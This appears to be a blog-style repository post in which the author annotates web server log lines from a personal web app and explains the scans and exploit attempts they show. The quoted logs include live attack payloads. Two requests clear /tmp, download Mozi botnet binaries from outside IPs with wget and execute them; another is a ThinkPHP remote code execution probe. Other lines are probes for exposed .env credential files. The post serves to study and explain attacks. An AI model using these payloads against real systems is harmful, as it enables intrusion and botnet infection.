# Inspecting Malicious Requests

I recently stood up a crude web application and my logs were capturing various requests my public IP was attracting.  I had seen some such requests before but finally decided it warranted a blog post, and you can read more here.

Otherwise, I'm posting this in a repository as a point of collaboration if any of my readers want to correct, inform, or expand.

## Log Lines and Narration

> `2021-04-25T10:19:17: GET /mysql/index.php?lang=en 404 0.940 ms - 1103`

PHP is a mainstay in the web development community, and there are many sites describing how it can integrate with mySQL.  'Index' here with the `php` extension implies some code process and not simply fetching a static resource (such as an html file).  Since this is under the `mysql` resource, it appears to be a big sniff to see if a console to the mysql db has been left open.

> `2021-04-25T10:21:27: GET /shell?cd+/tmp;rm+-rf+*;wget+http://172.36.40.208:44947/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws 404 0.964 ms - 1103`

Immediately one can recognize the `shell` resource, that this is a flavor of a [bashdoor](https://securityintelligence.com/articles/shellshock-vulnerability-in-depth/) attack or attempting to insert and invoke arbitrary code at the command line level.  It first tries to clear out everything in the 'tmp' direcotry (`cd /tmp; rm -rf *`) before fetching (`wget`) a remotely hosted file ('Mozi.a`, part of the [Mirai botnet](https://isc.sans.edu/forums/diary/Honeypot+Scanning+and+Targeting+Devices+Services/25928/)) and then tries to invoke.  

> `2021-04-25T11:17:53: GET http://169.254.169.254/latest/meta-data/ 404 1.033 ms - 1103`

Not an attack, rather something particular to AWS EC2 [instance metadata](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/instancedata-data-retrieval.html).  I believe it's the AWS SDK (within my NodeJS application) locally looking for the metadata containing the AWS credentials (since my web app was integrated with DynamoDB).  Noteworthy is the IP `169.254.169.254` is special to every EC2 instance.

> `2021-04-25T11:49:04: POST /HNAP1/ 404 0.837 ms - 1103`

Home Network Administration Protocl ([HNAP](https://routersecurity.org/hnap.php)) is a Cisco proprietary protocl for managing network devices, going back to 2007.  There was a [worm back in 2014](https://isc.sans.edu/diary/Linksys+Worm+%22TheMoon%22+Summary%3A+What+we+know+so+far/17633), which used the HNAP1 protocol to identify specific Linksys routers (firmware etc.), and then send a second request to invoke an exploit at the CGI/script level.

> `2021-04-25T14:57:06: GET /.env 404 0.919 ms - 1103`

The `.env` is not specific to one framework or language, but actually closert to industry convention.  I think this request is simply hoping that the server is simply hosting a directory and that an `.env` might be exposed possibly revealing things like API or credential keys/tokens.

> `2021-04-25T17:00:00: POST http://likeapro.best/`

I tried the URl, and it was a 'Not Found', so who knows.  Maybe someone is hoping to get more traffic to a site laiden with ads.

> `2021-04-25T18:04:09: GET /config/getuser?index=0 404 0.940 ms - 1103`

Specific D-Link wi-fi camears had a vulnerability where the remote administrator vould be directly queried without authentication!  Hoorah for the National Vulnerability Database (NIST), the page for [this vulnerability](https://nvd.nist.gov/vuln/detail/CVE-2020-25078#vulnCurrentDescriptionTitle) in particular was fun to read through and click the links deeper into the vulnerability and who/how it was uncovered.

> `2021-04-25T20:12:45: POST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php 404 1.083 ms - 1103`

This is a [vulnerability](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-9841) for specific version of [PHPUnit](https://phpunit.de), where arbitrary PHP code could be executed!  Here's a very [detailed story](https://thephp.cc/articles/phpunit-a-security-risk) (by a PHP expert), on how this impacted a retail website.  The first link is to [cve.mitre.org](cve.mitre.org), a vulnerability catalog sponsored by USA's DHS and CISA, and the actual site is maintained by the MITRE Corp. 


> `2021-04-25T20:12:45: POST /api/jsonws/invoke 404 0.656 ms - 1103`

[Liferay](https://www.liferay.com) is a digital portal/platform product, which had a JSON (deserialization) and remove code execution [vulnerability](https://codewhitesec.blogspot.com/2020/03/liferay-portal-json-vulns.html) ([CVE-2020-7961](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-7961)) in March of 2020 and documented by [Code White](https://codewhitesec.blogspot.com).  Bonus, someone created a [scanner](https://github.com/random-robbie/liferay-pwn) (github) for this vulnerability.


2021-04-25T20:12:45: GET /solr/admin/info/system?wt=json 404 0.989 ms - 1103

Ranked as the [#7 Web Service Exploit of 2020](https://blog.radware.com/security/2020/12/the-top-web-service-exploits-in-2020/), even though Apache [published an issue](https://issues.apache.org/jira/browse/SOLR-4882) back in 2013!  The above request is a scan looking for specific versions of Apache Solr (search platform), where a particular parameter is exposed and can lead to arbitrary file reading.  Apparently this is combined with some other vulnerabilities to eventually get to remote code execution, detailed in [CVE-2013-6397](https://nvd.nist.gov/vuln/detail/CVE-2013-6397).

## No Narration (yet)

```
2021-04-25T20:12:45: GET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP21 404 0.918 ms - 1103
2021-04-25T20:12:45: GET /wp-content/plugins/wp-file-manager/readme.txt 404 0.866 ms - 1103
2021-04-25T20:12:46: POST /Autodiscover/Autodiscover.xml 404 1.512 ms - 1103
2021-04-25T20:12:46: GET /console/ 404 0.771 ms - 1103
2021-04-25T20:12:46: GET /_ignition/execute-solution 404 0.936 ms - 1103
2021-04-25T22:00:03: GET /.env 404 4.342 ms - 1103
2021-04-25T22:00:04: POST / 404 0.994 ms - 1103
2021-04-26T06:08:45: POST /GponForm/diag_Form?images/ 404 0.736 ms - 1103
2021-04-26T10:42:36: GET /laravel/.env 404 0.658 ms - 1103
2021-04-26T10:42:36: GET /app/.env 404 0.619 ms - 1103
2021-04-26T10:42:36: GET /application/configs/application.ini 404 0.712 ms - 1103
2021-04-26T10:42:36: GET /application/application.ini 404 0.656 ms - 1103
2021-04-26T10:42:36: GET /vendor/laravel/.env 404 0.641 ms - 1103
2021-04-26T10:42:36: GET /wp-content/uploads/wc-logs/ 404 0.677 ms - 1103
2021-04-26T11:38:52: POST /Autodiscover/Autodiscover.xml 404 0.836 ms - 1103
2021-04-26T11:38:52: GET /console/ 404 0.711 ms - 1103
2021-04-26T11:38:53: GET /_ignition/execute-solution 404 1.475 ms - 1103
2021-04-26T16:41:52: GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://58.248.142.207:49791/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 404 0.969 ms - 1103
```
